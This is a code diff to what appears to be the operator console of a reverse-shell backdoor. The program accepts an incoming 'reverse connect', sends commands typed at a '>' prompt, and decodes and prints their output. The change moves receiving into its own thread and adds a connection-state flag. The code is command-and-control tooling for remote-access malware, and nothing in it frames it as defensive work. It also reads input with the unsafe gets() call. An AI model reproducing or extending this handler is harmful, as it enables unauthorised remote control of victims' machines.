@@ -46,6 +46,22 @@ long string_to_number(const char* input_string) {
 }
 
 const string quit("quit");
+bool connect_stat=false;
+
+static void recv_thread(unsigned int sock_accept) {
+    while (1) {
+        char result[PAGE_BUFFER_LENGTH]={0};
+        int recv_length=recv(sock_accept,result,PAGE_BUFFER_LENGTH,0);
+        if (SOCKET_ERROR!=recv_length) {
+            network_decode(result,recv_length);
+            printf("%s\n",result);
+        } else {
+            printf("WARNING! lost connect ..\n");
+            break;
+        }
+    }
+    connect_stat=false;
+}
 
 void main(void) {
     int bind_port=DEFAULT_PORT;
@@ -76,8 +92,10 @@ void main(void) {
             SOCKET sock_accept=accept(sock,NULL,NULL);
 
             if (SOCKET_ERROR!=sock_accept) {
+                connect_stat=true;
                 printf("reverse connect OK!:\n");
-                while (true) {
+                CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)recv_thread,(void*)sock_accept,NULL,NULL);
+                while (connect_stat) {
                     printf(">");
                     char command[PACKET_SEND_BUFFER]={0};
                     gets(command);
@@ -98,17 +116,6 @@ void main(void) {
                     }
                     if (resolve==quit) {
                         printf("Exit Server!\n");
-                        break;
-                    }
-
-                    char result[PAGE_BUFFER_LENGTH]={0};
-                    int recv_length=recv(sock_accept,result,PAGE_BUFFER_LENGTH,0);
-
-                    if (SOCKET_ERROR!=recv_length) {
-                        network_decode(result,recv_length);
-                        printf("%s\n\n",result);
-                    } else {
-                        printf("WARNING! lost connect ..\n");
                         break;
                     }
                 }
